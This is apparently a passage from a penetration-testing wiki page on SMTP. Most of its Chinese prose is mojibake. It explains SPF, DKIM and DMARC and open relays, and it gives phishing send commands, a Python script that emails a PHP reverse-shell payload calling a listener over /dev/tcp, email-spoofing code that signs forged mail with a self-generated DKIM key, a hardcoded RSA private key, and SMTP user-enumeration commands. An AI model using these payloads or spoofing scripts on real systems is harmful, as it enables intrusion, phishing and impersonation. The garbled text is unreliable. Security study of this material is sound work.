- End manual input with a CTRL-D on its own line.

IT Dept,

We are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems.

Sincerely,
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
### ä½¿ç”¨Pythonå‘é€ç”µå­é‚®ä»¶

ä»¥ä¸‹æ˜¯ä½¿ç”¨Pythonè„šæœ¬å‘é€ç”µå­é‚®ä»¶çš„å¦ä¸€ç§æ–¹æ³•ï¼š
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
## é‚®ä»¶æ¬ºéª—

æœ¬èŠ‚å¤§éƒ¨åˆ†å†…å®¹æ‘˜è‡ªä¹¦ç±ã€Šç½‘ç»œå®‰å…¨è¯„ä¼°ç¬¬ä¸‰ç‰ˆã€‹ã€‚

SMTPæ¶ˆæ¯å¾ˆå®¹æ˜“è¢«ä¼ªé€ ï¼Œå› æ­¤ç»„ç»‡ä½¿ç”¨SPFã€DKIMå’ŒDMARCåŠŸèƒ½æ¥é˜²æ­¢æœªç»æˆæƒçš„é‚®ä»¶å‘é€ã€‚

è¿™äº›å¯¹ç­–çš„**å®Œæ•´æŒ‡å—**å¯ä»¥åœ¨[https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/)æ‰¾åˆ°ã€‚

### SPF

{% hint style="danger" %}
SPFåœ¨2014å¹´è¢«"å¼ƒç”¨"äº†ã€‚è¿™æ„å‘³ç€ä¸å†åœ¨`_spf.domain.com`ä¸­åˆ›å»º**TXTè®°å½•**ï¼Œè€Œæ˜¯åœ¨`domain.com`ä¸­ä½¿ç”¨**ç›¸åŒçš„è¯­æ³•**åˆ›å»ºã€‚\
æ­¤å¤–ï¼Œä¸ºäº†é‡ç”¨ä»¥å‰çš„SPFè®°å½•ï¼Œé€šå¸¸ä¼šæ‰¾åˆ°ç±»ä¼¼äº`"v=spf1 include:_spf.google.com ~all"`çš„å†…å®¹ã€‚
{% endhint %}

**å‘ä»¶äººç­–ç•¥æ¡†æ¶**ï¼ˆSPFï¼‰æä¾›äº†ä¸€ç§æœºåˆ¶ï¼Œå…è®¸MTAæ£€æŸ¥å‘é€ç”µå­é‚®ä»¶çš„ä¸»æœºæ˜¯å¦ç»è¿‡æˆæƒã€‚\
ç„¶åï¼Œç»„ç»‡å¯ä»¥å®šä¹‰ä¸€ç³»åˆ—æˆæƒçš„é‚®ä»¶æœåŠ¡å™¨ï¼ŒMTAå¯ä»¥æŸ¥è¯¢è¿™äº›åˆ—è¡¨ä»¥æ£€æŸ¥ç”µå­é‚®ä»¶æ˜¯å¦è¢«ä¼ªé€ ã€‚\
ä¸ºäº†å®šä¹‰å…è®¸ä»£è¡¨åŸŸåå‘é€ç”µå­é‚®ä»¶çš„IPåœ°å€/èŒƒå›´ã€åŸŸåå’Œå…¶ä»–å†…å®¹ï¼Œåœ¨SPFæ³¨å†Œè¡¨ä¸­å¯ä»¥å‡ºç°ä¸åŒçš„â€œæœºåˆ¶â€ã€‚

#### æœºåˆ¶

| æœºåˆ¶     | æè¿°                                                                                                                                                                                                                                                                                                                               |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | å§‹ç»ˆåŒ¹é…ï¼›ç”¨äºæ‰€æœ‰æœªè¢«å‰é¢æœºåˆ¶åŒ¹é…çš„IPçš„é»˜è®¤ç»“æœï¼Œä¾‹å¦‚`-all`ã€‚                                                                                                                                                                                                                                                                      |
| A         | å¦‚æœåŸŸåå…·æœ‰å¯ä»¥è§£æä¸ºå‘ä»¶äººåœ°å€çš„åœ°å€è®°å½•ï¼ˆAæˆ–AAAAï¼‰ï¼Œåˆ™åŒ¹é…ã€‚                                                                                                                                                                                                                                                                     |
| IP4       | å¦‚æœå‘ä»¶äººåœ¨ç»™å®šçš„IPv4åœ°å€èŒƒå›´å†…ï¼Œåˆ™åŒ¹é…ã€‚                                                                                                                                                                                                                                                                                          |
| IP6       | å¦‚æœå‘ä»¶äººåœ¨ç»™å®šçš„IPv6åœ°å€èŒƒå›´å†…ï¼Œåˆ™åŒ¹é…ã€‚                                                                                                                                                                                                                                                                                          |
| MX        | å¦‚æœåŸŸåå…·æœ‰è§£æä¸ºå‘ä»¶äººåœ°å€çš„MXè®°å½•ï¼Œå®ƒå°†åŒ¹é…ï¼ˆå³é‚®ä»¶æ¥è‡ªåŸŸçš„ä¼ å…¥é‚®ä»¶æœåŠ¡å™¨ä¹‹ä¸€ï¼‰ã€‚                                                                                                                                                                                                                                                  |
| PTR       | å¦‚æœå®¢æˆ·ç«¯åœ°å€çš„åŸŸåï¼ˆPTRè®°å½•ï¼‰åœ¨ç»™å®šçš„åŸŸä¸­ï¼Œå¹¶ä¸”è¯¥åŸŸåè§£æä¸ºå®¢æˆ·ç«¯åœ°å€ï¼ˆæ­£å‘ç¡®è®¤åå‘DNSï¼‰ï¼Œåˆ™åŒ¹é…ã€‚å¦‚æœå¯èƒ½ï¼Œåº”é¿å…ä½¿ç”¨æ­¤æœºåˆ¶ã€‚                                                                                                                                                                                                         |
| EXISTS    | å¦‚æœç»™å®šçš„åŸŸåè§£æä¸ºä»»ä½•åœ°å€ï¼Œåˆ™åŒ¹é…ï¼ˆæ— è®ºè§£æä¸ºä½•åœ°å€ï¼‰ã€‚è¿™å¾ˆå°‘ä½¿ç”¨ã€‚ä¸SPFå®è¯­è¨€ä¸€èµ·ï¼Œå®ƒæä¾›äº†æ›´å¤æ‚çš„åŒ¹é…ï¼Œå¦‚DNSBLæŸ¥è¯¢ã€‚                                                                                                                                                                                                             |
| INCLUDE   | å¼•ç”¨å¦ä¸€ä¸ªåŸŸçš„ç­–ç•¥ã€‚å¦‚æœè¯¥åŸŸçš„ç­–ç•¥é€šè¿‡ï¼Œåˆ™æ­¤æœºåˆ¶é€šè¿‡ã€‚ä½†æ˜¯ï¼Œå¦‚æœåŒ…å«çš„ç­–ç•¥å¤±è´¥ï¼Œåˆ™ç»§ç»­å¤„ç†ã€‚è¦å®Œå…¨å§”æ‰˜ç»™å¦ä¸€ä¸ªåŸŸçš„ç­–ç•¥ï¼Œå¿…é¡»ä½¿ç”¨é‡å®šå‘æ‰©å±•ã€‚                                                                                                                                                                                               |
| REDIRECT  | <p>é‡å®šå‘æ˜¯æŒ‡å‘æ‰˜ç®¡SPFç­–ç•¥çš„å¦ä¸€ä¸ªåŸŸåçš„æŒ‡é’ˆï¼Œå®ƒå…è®¸å¤šä¸ªåŸŸå…±äº«ç›¸åŒçš„SPFç­–ç•¥ã€‚å½“å¤„ç†å¤§é‡å…±äº«ç›¸åŒç”µå­é‚®ä»¶åŸºç¡€ç»“æ„çš„åŸŸæ—¶ï¼Œå®ƒéå¸¸æœ‰ç”¨ã€‚</p><p>å°†ä½¿ç”¨é‡å®šå‘æœºåˆ¶ä¸­æŒ‡ç¤ºçš„åŸŸçš„SPFç­–ç•¥ã€‚</p> |

è¿˜å¯ä»¥è¯†åˆ«**é™å®šç¬¦**ï¼ŒæŒ‡ç¤º**å¦‚æœåŒ¹é…äº†æŸä¸ªæœºåˆ¶åº”è¯¥æ‰§è¡Œä»€ä¹ˆæ“ä½œ**ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä½¿ç”¨**é™å®šç¬¦"+"**ï¼ˆå› æ­¤å¦‚æœåŒ¹é…äº†ä»»ä½•æœºåˆ¶ï¼Œè¡¨ç¤ºå…è®¸ï¼‰ã€‚\
é€šå¸¸ï¼Œæ‚¨ä¼šåœ¨æ¯ä¸ªSPFç­–ç•¥çš„æœ«å°¾æ³¨æ„åˆ°ç±»ä¼¼äº**\~all**æˆ–**-all**çš„å†…å®¹ã€‚è¿™ç”¨äºæŒ‡ç¤º**å¦‚æœå‘ä»¶äººä¸ç¬¦åˆä»»ä½•SPFç­–ç•¥ï¼Œåˆ™åº”å°†ç”µå­é‚®ä»¶æ ‡è®°ä¸ºä¸å¯ä¿¡ï¼ˆ\~ï¼‰æˆ–æ‹’ç»ï¼ˆ-ï¼‰ç”µå­é‚®ä»¶ã€‚**

#### é™å®šç¬¦

æ¯ä¸ªæœºåˆ¶å¯ä»¥ä¸ä»¥ä¸‹å››ä¸ªé™å®šç¬¦ä¹‹ä¸€ç»“åˆä½¿ç”¨ï¼š

* **`+`** è¡¨ç¤ºé€šè¿‡ã€‚å¯ä»¥çœç•¥ï¼›ä¾‹å¦‚ï¼Œ`+mx`ä¸`mx`ç›¸åŒã€‚
* **`?`** è¡¨ç¤ºä¸­ç«‹ç»“æœï¼Œè§£é‡Šä¸ºæ— ï¼ˆæ— ç­–ç•¥ï¼‰ã€‚
* **`~`**ï¼ˆæ³¢æµªå·ï¼‰è¡¨ç¤ºè½¯å¤±è´¥ï¼Œä»‹äºä¸­ç«‹å’Œå¤±è´¥ä¹‹é—´çš„è°ƒè¯•è¾…åŠ©ã€‚é€šå¸¸ï¼Œè¿”å›è½¯å¤±è´¥çš„æ¶ˆæ¯ä¼šè¢«æ¥å—ä½†ä¼šè¢«æ ‡è®°ã€‚
* **`-`**ï¼ˆå‡å·ï¼‰è¡¨ç¤ºå¤±è´¥ï¼Œåº”æ‹’ç»é‚®ä»¶ï¼ˆè§ä¸‹æ–‡ï¼‰ã€‚

åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæ‚¨å¯ä»¥é˜…è¯»**google.comçš„SPFç­–ç•¥**ã€‚è¯·æ³¨æ„ï¼Œ**ç¬¬ä¸€ä¸ªSPFç­–ç•¥åŒ…å«å…¶ä»–åŸŸçš„SPFç­–ç•¥ï¼š**
```shell-session
kali@kali:~$ dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

kali@kali:~$ dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

kali@kali:~$ dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

kali@kali:~$ dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

kali@kali:~$ dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
ä¼ ç»Ÿä¸Šï¼Œå¯ä»¥ä¼ªé€ ä»»ä½•æ²¡æœ‰æ­£ç¡®/ä»»ä½•SPFè®°å½•çš„åŸŸåã€‚**ç°åœ¨**ï¼Œå¦‚æœ**ç”µå­é‚®ä»¶**æ¥è‡ªæ²¡æœ‰æœ‰æ•ˆSPFè®°å½•çš„åŸŸåï¼Œå¾ˆå¯èƒ½ä¼šè¢«**è‡ªåŠ¨æ‹’ç»/æ ‡è®°ä¸ºä¸å¯ä¿¡**ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨åœ¨çº¿å·¥å…·ï¼ˆå¦‚ï¼š[https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)ï¼‰æ¥æ£€æŸ¥åŸŸåçš„SPFã€‚

### DKIM

åŸŸé”®æ ‡è¯†é‚®ä»¶ï¼ˆDKIMï¼‰æ˜¯ä¸€ç§æœºåˆ¶ï¼Œé€šè¿‡åœ¨æ£€ç´¢åŸŸçš„å…¬é’¥æ—¶ï¼Œå¤–éƒ¨MTAå¯¹å‡ºç«™ç”µå­é‚®ä»¶è¿›è¡Œç­¾åå’ŒéªŒè¯ã€‚DKIMå…¬é’¥ä¿å­˜åœ¨åŸŸçš„TXTè®°å½•ä¸­ï¼›ä½†æ˜¯ï¼Œæ‚¨å¿…é¡»çŸ¥é“é€‰æ‹©å™¨å’ŒåŸŸåæ‰èƒ½æ£€ç´¢å®ƒã€‚

ç„¶åï¼Œè¦è¯·æ±‚å¯†é’¥ï¼Œæ‚¨éœ€è¦ä»é‚®ä»¶å¤´`DKIM-Signature`ä¸­è·å–é‚®ä»¶çš„åŸŸåå’Œé€‰æ‹©å™¨ï¼Œä¾‹å¦‚ï¼š`d=gmail.com;s=20120113`
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCg
KCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC

Domain-based Message Authentication, Reporting & Conformance (DMARC) æ˜¯ä¸€ç§é‚®ä»¶è®¤è¯æ–¹æ³•ï¼Œæ‰©å±•äº† SPF å’Œ DKIMã€‚ç­–ç•¥æŒ‡ç¤ºé‚®ä»¶æœåŠ¡å™¨å¦‚ä½•å¤„ç†ç»™å®šåŸŸçš„ç”µå­é‚®ä»¶å¹¶æŠ¥å‘Šæ‰€æ‰§è¡Œçš„æ“ä½œã€‚

![](<../../.gitbook/assets/image (134).png>)

**è¦è·å– DMARC è®°å½•ï¼Œæ‚¨éœ€è¦æŸ¥è¯¢å­åŸŸ \_dmarc**
```shell-session
root@kali:~# dig _dmarc.yahoo.com txt | grep DMARC
_dmarc.yahoo.com.  1785 IN TXT "v=DMARC1\; p=reject\; sp=none\; pct=100\;
rua=mailto:dmarc-yahoo-rua@yahoo-inc.com, mailto:dmarc_y_rua@yahoo.com\;"

root@kali:~# dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com. 600 IN TXT "v=DMARC1\; p=quarantine\; rua=mailto:mailauth-reports@google.com"

root@kali:~# dig _dmarc.paypal.com txt | grep DMARC
_dmarc.paypal.com. 300 IN TXT "v=DMARC1\; p=reject\; rua=mailto:d@rua.agari.com\;
ruf=mailto:dk@bounce.paypal.com,mailto:d@ruf.agari.com"
```
PayPalå’ŒYahooæŒ‡ç¤ºé‚®ä»¶æœåŠ¡å™¨æ‹’ç»åŒ…å«æ— æ•ˆDKIMç­¾åæˆ–ä¸æ¥è‡ªå…¶ç½‘ç»œçš„æ¶ˆæ¯ã€‚ç„¶åï¼Œé€šçŸ¥å°†å‘é€åˆ°å„ä¸ªç»„ç»‡å†…çš„ç›¸åº”ç”µå­é‚®ä»¶åœ°å€ã€‚Googleä¹Ÿä»¥ç±»ä¼¼çš„æ–¹å¼è¿›è¡Œé…ç½®ï¼Œå°½ç®¡å®ƒæŒ‡ç¤ºé‚®ä»¶æœåŠ¡å™¨å¯¹æ¶ˆæ¯è¿›è¡Œéš”ç¦»è€Œä¸æ˜¯ç›´æ¥æ‹’ç»ã€‚

#### DMARCæ ‡ç­¾

| æ ‡ç­¾åç§° | ç›®çš„                                           | ç¤ºä¾‹                            |
| -------- | ---------------------------------------------- | ------------------------------- |
| v        | åè®®ç‰ˆæœ¬                                       | v=DMARC1                        |
| pct      | ç»è¿‡è¿‡æ»¤çš„æ¶ˆæ¯ç™¾åˆ†æ¯”                           | pct=20                          |
| ruf      | ç”¨äºæ³•åŒ»æŠ¥å‘Šçš„æŠ¥å‘ŠURI                           | ruf=mailto:authfail@example.com |
| rua      | èšåˆæŠ¥å‘Šçš„æŠ¥å‘ŠURI                               | rua=mailto:aggrep@example.com   |
| p        | ç»„ç»‡åŸŸçš„ç­–ç•¥                                   | p=quarantine                    |
| sp       | ODçš„å­åŸŸçš„ç­–ç•¥                                 | sp=reject                       |
| adkim    | DKIMçš„å¯¹é½æ¨¡å¼                                 | adkim=s                         |
| aspf     | SPFçš„å¯¹é½æ¨¡å¼                                  | aspf=r                          |

### **å­åŸŸåæ€ä¹ˆåŠï¼Ÿ**

**æ¥è‡ª**[**è¿™é‡Œ**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**ã€‚**\
æ‚¨éœ€è¦ä¸ºæ¯ä¸ªå¸Œæœ›ä»ä¸­å‘é€é‚®ä»¶çš„å­åŸŸè®¾ç½®å•ç‹¬çš„SPFè®°å½•ã€‚\
ä»¥ä¸‹å†…å®¹æœ€åˆå‘å¸ƒåœ¨openspf.orgä¸Šï¼Œè¿™æ›¾ç»æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„èµ„æºã€‚

> Demonçš„é—®é¢˜ï¼šå­åŸŸåæ€ä¹ˆåŠï¼Ÿ
>
> å¦‚æœæˆ‘ä»pielovers.demon.co.ukæ”¶åˆ°é‚®ä»¶ï¼Œå¹¶ä¸”pieloversæ²¡æœ‰SPFæ•°æ®ï¼Œæˆ‘åº”è¯¥è¿”å›ä¸€çº§å¹¶æµ‹è¯•demon.co.ukçš„SPFå—ï¼Ÿä¸ã€‚Demonçš„æ¯ä¸ªå­åŸŸéƒ½æ˜¯ä¸åŒçš„å®¢æˆ·ï¼Œæ¯ä¸ªå®¢æˆ·å¯èƒ½æœ‰è‡ªå·±çš„ç­–ç•¥ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒDemonçš„ç­–ç•¥é€‚ç”¨äºå…¶æ‰€æœ‰å®¢æˆ·æ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼›å¦‚æœDemonæƒ³è¦è¿™æ ·åšï¼Œå®ƒå¯ä»¥ä¸ºæ¯ä¸ªå­åŸŸè®¾ç½®SPFè®°å½•ã€‚
>
> å› æ­¤ï¼Œå¯¹äºSPFå‘å¸ƒè€…çš„å»ºè®®æ˜¯ï¼šæ‚¨åº”è¯¥ä¸ºæ¯ä¸ªå…·æœ‰Aæˆ–MXè®°å½•çš„å­åŸŸæˆ–ä¸»æœºåæ·»åŠ SPFè®°å½•ã€‚
>
> å…·æœ‰é€šé…ç¬¦Aæˆ–MXè®°å½•çš„ç«™ç‚¹è¿˜åº”å…·æœ‰é€šé…ç¬¦SPFè®°å½•ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š\* IN TXT "v=spf1 -all"

è¿™æ˜¯æœ‰é“ç†çš„-å­åŸŸåå¾ˆå¯èƒ½ä½äºä¸åŒçš„åœ°ç†ä½ç½®ï¼Œå¹¶ä¸”å…·æœ‰éå¸¸ä¸åŒçš„SPFå®šä¹‰ã€‚

### **å¼€æ”¾ä¸­ç»§**

ä¸ºäº†é˜²æ­¢å‘é€çš„ç”µå­é‚®ä»¶è¢«åƒåœ¾é‚®ä»¶è¿‡æ»¤å™¨è¿‡æ»¤å¹¶æœªèƒ½åˆ°è¾¾æ”¶ä»¶äººï¼Œå‘ä»¶äººå¯ä»¥ä½¿ç”¨æ”¶ä»¶äººä¿¡ä»»çš„**ä¸­ç»§æœåŠ¡å™¨**ã€‚é€šå¸¸ï¼Œç®¡ç†å‘˜**æ²¡æœ‰æ¦‚è¿°**ä»–ä»¬å¿…é¡»**å…è®¸**çš„**IP**èŒƒå›´ã€‚è¿™å¯¼è‡´SMTPæœåŠ¡å™¨çš„é”™è¯¯é…ç½®ï¼Œæˆ‘ä»¬åœ¨å¤–éƒ¨å’Œå†…éƒ¨æ¸—é€æµ‹è¯•ä¸­ç»å¸¸å‘ç°è¿™ç§æƒ…å†µã€‚å› æ­¤ï¼Œä»–ä»¬**å…è®¸æ‰€æœ‰IPåœ°å€**ï¼Œä»¥å…åœ¨ç”µå­é‚®ä»¶æµé‡ä¸­å¼•å‘é”™è¯¯ï¼Œä»è€Œä¸ä¼šå¹²æ‰°æˆ–æ„å¤–ä¸­æ–­ä¸æ½œåœ¨å’Œç°æœ‰å®¢æˆ·çš„é€šä¿¡ï¼š
```shell-session
mynetworks = 0.0.0.0/0
```

```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **å·¥å…·**

* [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **æ£€æŸ¥SPFå’ŒDMARCçš„é…ç½®é”™è¯¯**
* [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **è‡ªåŠ¨è·å–SPFå’ŒDMARCçš„é…ç½®**

### å‘é€ä¼ªé€ é‚®ä»¶

* [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
* [**http://www.anonymailer.net/**](http://www.anonymailer.net)
* [**https://emkei.cz/**](https://emkei.cz/)\*\*\*\*

**æˆ–è€…ä½ å¯ä»¥ä½¿ç”¨ä¸€ä¸ªå·¥å…·:**

* [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)\*\*\*\*
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
{% hint style="warning" %}
å¦‚æœæ‚¨åœ¨ä½¿ç”¨ dkim python lib è§£æå¯†é’¥æ—¶é‡åˆ°ä»»ä½•é”™è¯¯ï¼Œè¯·éšæ„ä½¿ç”¨ä»¥ä¸‹å¯†é’¥ã€‚\
**æ³¨æ„**ï¼šè¿™åªæ˜¯ä¸€ä¸ªå¿«é€Ÿä¿®å¤æ–¹æ³•ï¼Œç”¨äºåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç”±äºæŸç§åŸå› ï¼Œopenssl ç§é’¥æ— æ³•è¢« dkim è§£ææ—¶è¿›è¡Œå¿«é€Ÿæ£€æŸ¥ã€‚
```
-----BEGIN RSA PRIVATE KEY-----
MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
-----END RSA PRIVATE KEY-----
```
{% endhint %}

**æˆ–è€…ä½ å¯ä»¥æ‰‹åŠ¨å®Œæˆï¼š**

{% tabs %}
{% tab title="PHP" %}
<pre class="language-php"><code class="lang-php"><strong># è¿™å°†å‘é€ä¸€æ¡æœªç­¾åçš„æ¶ˆæ¯
</strong><strong>mail("your_email@gmail.com", "æµ‹è¯•ä¸»é¢˜ï¼", "å˜¿ï¼è¿™æ˜¯ä¸€ä¸ªæµ‹è¯•", "From: administrator@victim.com");
</strong></code></pre>
{% endtab %}

{% tab title="Python" %}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{% endtab %}
{% endtabs %}

### **æ›´å¤šä¿¡æ¯**

**åœ¨** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/) **ä¸­æ‰¾åˆ°æœ‰å…³è¿™äº›ä¿æŠ¤æªæ–½çš„æ›´å¤šä¿¡æ¯**

### **å…¶ä»–é’“é±¼æŒ‡æ ‡**

* åŸŸåçš„å¹´é¾„
* æŒ‡å‘IPåœ°å€çš„é“¾æ¥
* é“¾æ¥æ“çºµæŠ€æœ¯
* å¯ç–‘ï¼ˆä¸å¸¸è§ï¼‰é™„ä»¶
* ç ´æŸçš„ç”µå­é‚®ä»¶å†…å®¹
* ä½¿ç”¨ä¸é‚®ä»¶å¤´ä¸åŒçš„å€¼
* å­˜åœ¨æœ‰æ•ˆä¸”å—ä¿¡ä»»çš„SSLè¯ä¹¦
* å°†é¡µé¢æäº¤ç»™Webå†…å®¹è¿‡æ»¤ç«™ç‚¹

## é€šè¿‡SMTPè¿›è¡Œæ•°æ®æ³„éœ²

**å¦‚æœæ‚¨å¯ä»¥é€šè¿‡SMTPå‘é€æ•°æ®**[**é˜…è¯»æ­¤å†…å®¹**](../../generic-methodologies-and-resources/exfiltration.md#smtp)**ã€‚**

## é…ç½®æ–‡ä»¶

### Postfix

é€šå¸¸ï¼Œå¦‚æœå®‰è£…äº†Postfixï¼Œåˆ™åœ¨`/etc/postfix/master.cf`ä¸­åŒ…å«**æ‰§è¡Œè„šæœ¬**çš„å†…å®¹ï¼Œä¾‹å¦‚å½“ç”¨æˆ·æ”¶åˆ°æ–°é‚®ä»¶æ—¶ã€‚ä¾‹å¦‚ï¼Œè¡Œ`flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}`è¡¨ç¤ºå¦‚æœç”¨æˆ·markæ”¶åˆ°æ–°é‚®ä»¶ï¼Œåˆ™å°†æ‰§è¡Œ`/etc/postfix/filtering`ã€‚

å…¶ä»–é…ç½®æ–‡ä»¶ï¼š
```
sendmail.cf
submit.cf
```
## HackTricks è‡ªåŠ¨å‘½ä»¤

### SMTP

#### SMTP User Enumeration

##### Manual Method

To enumerate valid users in an SMTP server, you can use the `VRFY` command. This command allows you to verify if a specific username exists in the server.

```
$ telnet <SMTP_SERVER> 25
VRFY <USERNAME>
```

##### Automatic Method

You can use the `smtp-user-enum` tool to automate the user enumeration process. This tool sends multiple `VRFY` requests to the SMTP server, allowing you to quickly identify valid usernames.

```
$ smtp-user-enum -M VRFY -U /path/to/usernames.txt -t <SMTP_SERVER>
```

#### SMTP User Enumeration with Metasploit

You can also use Metasploit to perform SMTP user enumeration. The `smtp_enum` module can be used for this purpose.

```
msf5 > use auxiliary/scanner/smtp/smtp_enum
msf5 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS <SMTP_SERVER>
msf5 auxiliary(scanner/smtp/smtp_enum) > run
```

#### SMTP User Enumeration with Nmap

Nmap can also be used to enumerate SMTP users. The `smtp-enum-users` script can be used for this purpose.

```
$ nmap -p 25 --script smtp-enum-users <SMTP_SERVER>
```

